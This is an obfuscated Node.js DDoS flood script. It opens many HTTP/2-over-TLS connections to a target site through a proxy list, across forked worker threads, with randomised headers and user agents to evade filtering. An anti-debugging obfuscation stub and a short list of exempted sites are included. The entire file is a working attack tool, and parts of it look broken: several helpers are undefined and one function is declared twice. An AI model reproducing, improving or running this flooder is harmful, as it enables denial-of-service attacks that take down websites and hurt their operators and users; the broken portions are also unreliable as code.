const net = require("net");
const http2 = require("http2");
const tls = require('tls');
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
lang_header = ["pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7", 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6", "nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7", "fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7", "sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7", "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'];
encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", '*'];
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
process.on("uncaughtException", function (_0x27f13d) {});
if (process.argv.length < 0x7) {
  console.log("node tls target time rate thread proxy".rainbow);
  process.exit();
}
const headers = {};
function readLines(_0x2ebd03) {
  const _0x5b4b07 = function () {
    let _0x3876e9 = true;
    return function (_0x3d94b4, _0x263af4) {
      const _0x417ef6 = _0x3876e9 ? function () {
        if (_0x263af4) {
          const _0xd4290d = _0x263af4.apply(_0x3d94b4, arguments);
          _0x263af4 = null;
          return _0xd4290d;
        }
      } : function () {};
      _0x3876e9 = false;
      return _0x417ef6;
    };
  }();
  const _0x88761 = _0x5b4b07(this, function () {
    return _0x88761.toString().search("(((.+)+)+)+$").toString().constructor(_0x88761).search("(((.+)+)+)+$");
  });
  _0x88761();
  const _0x3e7870 = function () {
    let _0x58d643 = true;
    return function (_0x295742, _0x1c2607) {
      const _0x1e8716 = _0x58d643 ? function () {
        if (_0x1c2607) {
          const _0x485b4f = _0x1c2607.apply(_0x295742, arguments);
          _0x1c2607 = null;
          return _0x485b4f;
        }
      } : function () {};
      _0x58d643 = false;
      return _0x1e8716;
    };
  }();
  (function () {
    _0x3e7870(this, function () {
      const _0x5567b5 = new RegExp("function *\\( *\\)");
      const _0xac137d = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
      const _0xf3b8bc = _0x5a3053("init");
      if (!_0x5567b5.test(_0xf3b8bc + "chain") || !_0xac137d.test(_0xf3b8bc + "input")) {
        _0xf3b8bc('0');
      } else {
        _0x5a3053();
      }
    })();
  })();
  const _0x3af3cb = function () {
    let _0x396ba3 = true;
    return function (_0x275d0c, _0xf15222) {
      const _0x49f1dd = _0x396ba3 ? function () {
        if (_0xf15222) {
          const _0x3a7378 = _0xf15222.apply(_0x275d0c, arguments);
          _0xf15222 = null;
          return _0x3a7378;
        }
      } : function () {};
      _0x396ba3 = false;
      return _0x49f1dd;
    };
  }();
  const _0x4398c6 = _0x3af3cb(this, function () {
    const _0x79314e = function () {
      let _0x224ec1;
      try {
        _0x224ec1 = Function("return (function() {}.constructor(\"return this\")( ));")();
      } catch (_0x15f77a) {
        _0x224ec1 = window;
      }
      return _0x224ec1;
    };
    const _0xaf9435 = _0x79314e();
    const _0x161ca7 = _0xaf9435.console = _0xaf9435.console || {};
    const _0x32eca2 = ['log', "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x228333 = 0x0; _0x228333 < _0x32eca2.length; _0x228333++) {
      const _0x2e0e86 = _0x3af3cb.constructor.prototype.bind(_0x3af3cb);
      const _0x2a782b = _0x32eca2[_0x228333];
      const _0x47f27c = _0x161ca7[_0x2a782b] || _0x2e0e86;
      _0x2e0e86.__proto__ = _0x3af3cb.bind(_0x3af3cb);
      _0x2e0e86.toString = _0x47f27c.toString.bind(_0x47f27c);
      _0x161ca7[_0x2a782b] = _0x2e0e86;
    }
  });
  _0x4398c6();
  return fs.readFileSync(_0x2ebd03, 'utf-8').toString().split(/\r?\n/);
}
function randomIntn(_0x4cffbf, _0x208bca) {
  return Math.floor(Math.random() * (_0x208bca - _0x4cffbf) + _0x4cffbf);
}
function randomElement(_0x1ecb88) {
  return _0x1ecb88[Math.floor(Math.random() * (_0x1ecb88.length - 0x0) + 0x0)];
}
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5],
  'proxyFile': process.argv[0x6]
};
const blackList = ["https://virustotal.com", "https://check-host.cc/", "https://check-host.net/", 'https://open.spotify.com', 'https://snapchat.com', "https://usa.gov", "https://fbi.gov", "https://nasa.gov", "https://google.com", "https://translate.google.com", "https://youtube.com", 'https://facebook.com', 'https://chat.openai.com', "https://shopee.vn", "https://mail.google.com", "https://tiktok.com", "https://instagram.com", "https://twitter.com", "https://telegram.org"];
if (blackList.includes(args.target)) {
  console.log("Website N\xE0y N\u1EB1m Trong Danh S\xE1ch Black List.");
  process.exit(0x1);
}
if (args.time < 0x0 || args.time < 1) {
  process.exit(0x1);
}
if (args.Rate < 0x0 || args.Rate < 1) {
  process.exit(0x1);
}
if (args.threads < 0x0 || args.threads < 1) {
  process.exit(0x1);
}
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
function readLines(_0x3b4fcf) {
  return fs.readFileSync(_0x3b4fcf, "utf-8").split("\n");
}
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
  if (parsedTarget.protocol === "http:") {
    parsedTarget.protocol = "https:";
  }
  const targetPort = parsedTarget.protocol === 'https:' ? 0x1bb : 0x50;
  setTimeout(() => {
    process.exit(0x1);
  }, process.argv[0x3] * 0x3e8);
}
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
setTimeout(function () {
  process.exit(0x1);
}, process.argv[0x3] * 0x3e8);
process.on("uncaughtException", function (_0x4507a9) {});
process.on("unhandledRejection", function (_0x5ddfe1) {});
class NetSocket {
  constructor() {}
  ['HTTP'](_0x4c4fe9, _0x5fd469) {
    const _0x534c69 = "CONNECT " + _0x4c4fe9.address + ":443 HTTP/1.1\r\nHost: " + _0x4c4fe9.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x197c28 = new Buffer.from(_0x534c69);
    const _0x4aa534 = net.connect({
      'host': _0x4c4fe9.host,
      'port': _0x4c4fe9.port,
      'allowHalfOpen': true,
      'writable': true,
      'readable': true
    });
    _0x4aa534.setTimeout(_0x4c4fe9.timeout * 0xa * 0x2710);
    _0x4aa534.on("connect", () => {
      _0x4aa534.write(_0x197c28);
    });
    _0x4aa534.on("data", _0x3208e0 => {
      const _0x3f5798 = _0x3208e0.toString("utf-8");
      const _0x45817a = _0x3f5798.includes("HTTP/1.1 200");
      if (_0x45817a === false) {
        _0x4aa534.destroy();
        return _0x5fd469(undefined, "error: invalid response from proxy server");
      }
      return _0x5fd469(_0x4aa534, undefined);
    });
    _0x4aa534.on("timeout", () => {
      _0x4aa534.destroy();
      return _0x5fd469(undefined, "error: timeout exceeded");
    });
  }
}
function getRandomUserAgent() {
  const _0x72afdd = ["Windows", "Windows NT 10.0", "Windows NT 6.1", "Windows NT 6.3", "Macintosh", "Android", "Linux"];
  const _0x5bfbf8 = ["Chrome", 'Firefox', "Safari", "Edge", "Opera"];
  const _0x5bbc35 = ["en-US", "en-GB", "fr-FR", "de-DE", "es-ES"];
  const _0x4a79ef = ['US', 'GB', 'FR', 'DE', 'ES'];
  const _0x36f434 = ["Windows", "Apple", "Google", 'Microsoft', 'Mozilla', "Opera Software"];
  const _0x26953e = _0x72afdd[Math.floor(Math.random() * _0x72afdd.length)];
  const _0x28b36d = _0x5bfbf8[Math.floor(Math.random() * _0x5bfbf8.length)];
  const _0x919e74 = _0x5bbc35[Math.floor(Math.random() * _0x5bbc35.length)];
  const _0x147541 = _0x4a79ef[Math.floor(Math.random() * _0x4a79ef.length)];
  const _0x2047ac = _0x36f434[Math.floor(Math.random() * _0x36f434.length)];
  const _0x15fde4 = Math.floor(Math.random() * 0x64) + 0x1;
  const _0x5b3548 = Math.floor(Math.random() * 0x6) + 0x1;
  const _0x5f3de7 = _0x2047ac + '/' + _0x28b36d + " " + _0x15fde4 + '.' + _0x15fde4 + '.' + _0x15fde4 + " (" + _0x26953e + "; " + _0x147541 + "; " + _0x919e74 + ')';
  const _0x3cdcf3 = btoa(_0x5f3de7);
  let _0x404c55 = '';
  for (let _0x30f324 = 0x0; _0x30f324 < _0x3cdcf3.length; _0x30f324++) {
    if (_0x30f324 % _0x5b3548 === 0x0) {
      _0x404c55 += _0x3cdcf3.charAt(_0x30f324);
    } else {
      _0x404c55 += _0x3cdcf3.charAt(_0x30f324).toUpperCase();
    }
  }
  return _0x404c55;
}
const Header = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers[':authority'] = randomString(0xa) + '.' + parsedTarget.host;
headers.accept = randomHeaders.accept;
headers["Accept-Encoding"] = "gzip, deflate, br";
headers["accept-language"] = headerFunc.lang();
headers["accept-encoding"] = headerFunc.encoding();
headers.Connection = Math.random() > 0.5 ? "keep-alive" : "close";
headers["upgrade-insecure-requests"] = Math.random() > 0.5;
headers["x-requested-with"] = "XMLHttpRequest";
headers.pragma = Math.random() > 0.5 ? "no-cache" : "max-age=0";
headers["cache-control"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
function runFlooder() {
  const _0x3919a3 = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x47fa50 = _0x3919a3.split(':');
  headers[':authority'] = parsedTarget.host;
  headers["user-agent"] = getRandomUserAgent();
  const _0x245bc2 = {
    'host': _0x47fa50[0x0],
    'port': ~~_0x47fa50[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0x64
  };
  Header.HTTP(_0x245bc2, (_0x41e820, _0x157876) => {
    if (_0x157876) {
      return;
    }
    _0x41e820.setKeepAlive(true, 0xea60);
    const _0x4c3f19 = {
      'ALPNProtocols': ['h3', 'h2', "http/1.1", 'h1', "spdy/3.1", 'http/2+quic/43', "http/2+quic/44", "http/2+quic/45"],
      'echdCurve': ["ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512", 'ecdsa_brainpoolP384r1tls13_sha384', "ecdsa_brainpoolP512r1tls13_sha512", 'ecdsa_sha1', "rsa_pss_pss_sha384", "GREASE:x25519:secp256r1:secp384r1", 'GREASE:X25519:x25519', "GREASE:X25519:x25519:P-256:P-384:P-521:X448"],
      'ciphers': "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
      'rejectUnauthorized': false,
      'socket': _0x41e820,
      'honorCipherOrder': true,
      'secure': true,
      'port': 0x1bb,
      'uri': parsedTarget.host,
      'servername': parsedTarget.host,
      'secureProtocol': ["TLS_client_method", "TLS_method", 'TLSv1_method', 'TLSv1_1_method', "TLSv1_2_method", "TLSv1_3_method", "TLSv2_method", "TLSv2_1_method", "TLSv2_2_method", 'TLSv2_3_method', "TLSv3_method", "TLSv3_1_method", "TLSv3_2_method", "TLSv3_3_method"],
      'secureOptions': crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1
    };
    const _0x4ad4ea = tls.connect(0x1bb, parsedTarget.host, _0x4c3f19);
    _0x4ad4ea.setKeepAlive(true, 600000);
    const _0x35204b = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x4e20,
        'initialWindowSize': 62914560,
        'maxHeaderListSize': 2621440,
        'enablePush': false
      },
      'maxSessionMemory': 0xfa00,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x4ad4ea,
      'socket': _0x41e820
    });
    _0x35204b.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x3e8,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x40000,
      'enablePush': false
    });
    _0x35204b.on("connect", () => {});
    _0x35204b.on('close', () => {
      _0x35204b.destroy();
      _0x41e820.destroy();
      return;
    });
    _0x35204b.on("error", _0x3bd264 => {
      _0x35204b.destroy();
      _0x41e820.destroy();
      return;
    });
  });
}
const KillScript = () => process.exit(0x1);
setTimeout(KillScript, args.time * 0x3e8);
function _0x5a3053(_0x5b8494) {
  function _0x4f6337(_0x3071d8) {
    if (typeof _0x3071d8 === 'string') {
      return function (_0x1d1c93) {}.constructor("while (true) {}").apply("counter");
    } else if (('' + _0x3071d8 / _0x3071d8).length !== 0x1 || _0x3071d8 % 0x14 === 0x0) {
      (function () {
        return true;
      }).constructor("debugger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debugger").apply("stateObject");
    }
    _0x4f6337(++_0x3071d8);
  }
  try {
    if (_0x5b8494) {
      return _0x4f6337;
    } else {
      _0x4f6337(0x0);
    }
  } catch (_0x505aef) {}
}